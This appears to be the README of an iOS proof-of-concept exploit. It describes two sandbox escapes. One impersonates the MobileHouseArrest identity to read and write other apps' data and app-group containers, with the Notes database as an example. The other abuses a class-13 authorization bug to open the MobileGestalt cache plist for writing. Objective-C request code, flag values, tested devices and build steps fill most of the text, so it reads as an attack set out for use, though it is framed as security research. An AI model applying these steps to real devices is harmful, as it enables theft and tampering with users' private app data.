# MobileHouseArrest container access PoC

MobileContainerManager trusted the caller's CodeDirectory identifier as an
authorization key. A development-signed app could use:

```text
com.apple.mobile.MobileHouseArrest
```

The app could request another app's data container or app-group container. The
returned sandbox extension gave read and write access while active.

The same PoC also implements the separate class-13 MobileGestalt authorization
bug. That route does not depend on the MobileHouseArrest identity.

## Paths

| Request | Path |
| --- | --- |
| Class 2 and an app identifier | `/private/var/mobile/Containers/Data/Application/<UUID>/` |
| Class 7 and an app-group identifier | `/private/var/mobile/Containers/Shared/AppGroup/<UUID>/` |
| Class 13 and `systemgroup.com.apple.mobilegestaltcache` | `/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/` |

The Notes app group, `group.com.apple.notes`, includes these files:

```text
/private/var/mobile/Containers/Shared/AppGroup/<Notes-group-UUID>/NoteStore.sqlite
/private/var/mobile/Containers/Shared/AppGroup/<Notes-group-UUID>/NoteStore.sqlite-wal
/private/var/mobile/Containers/Shared/AppGroup/<Notes-group-UUID>/NoteStore.sqlite-shm
```

The request selects a container identifier. It does not accept an arbitrary
filesystem path.

## MobileHouseArrest request

```objc
container_query_t query = query_create();
query_set_class(query, 2);

xpc_object_t identifier = xpc_string_create(
    "local.research.SandboxCanaryVictim");
query_set_ids(query, identifier);

query_set_flags(query, UINT64_C(0x900000000));
if (query_set_part != NULL)
    query_set_part(query, 0);

container_object_t object = query_result(query);
BOOL activated = object != NULL && activate(object, false);
```

After activation, normal file APIs can read and write inside the container.

## Class-13 MobileGestalt request

A separate class-13 authorization bug gave read and write access to this fixed
directory:

```text
/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/
```

This directory contains:

```text
/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist
```

The request uses class 13, the MobileGestalt system-group identifier, part 3,
and read/write flags.

```objc
container_query_t query = query_create();
query_set_class(query, 13);

xpc_object_t group = xpc_string_create(
    "systemgroup.com.apple.mobilegestaltcache");
query_set_group_ids(query, group);

query_set_flags(query, UINT64_C(0x8100000000));
query_set_part(query, 3);
```

`run_mobilegestalt_class13_poc()` requires a sandbox token. It activates the
token and opens the live plist with `O_RDWR`. It does not change the plist.

## Tested devices

These results apply to the class-13 MobileGestalt route.

| Device | Version | Result |
| --- | --- | --- |
| iPhone 11 | iOS 27 beta 4 | Working. The token grants `O_RDWR` access to the plist. |
| iPhone 11 | iOS 26 | Not supported by this PoC. The query returns the cache path without usable file access. |
| iPhone 16 Pro Max | iOS 18 | Not supported by this PoC. The query returns the system-group root without a sandbox token. |

## TODO

- Add the iOS 26 class-13 request that grants real file access.
- Add an iOS 18 request that does not require the newer `part` API.
- Select the correct request at runtime after both paths pass `O_RDWR` checks.

## Use

1. Add [`poc.m`](poc.m) to an Objective-C iOS application target.
2. Build with the `iphoneos` SDK for `arm64e`.
3. Set the bundle identifier to `com.apple.mobile.MobileHouseArrest` and call
   `run_mobilehousearrest_poc()` for cross-container access.
4. Call `run_mobilegestalt_class13_poc()` for the MobileGestalt route.
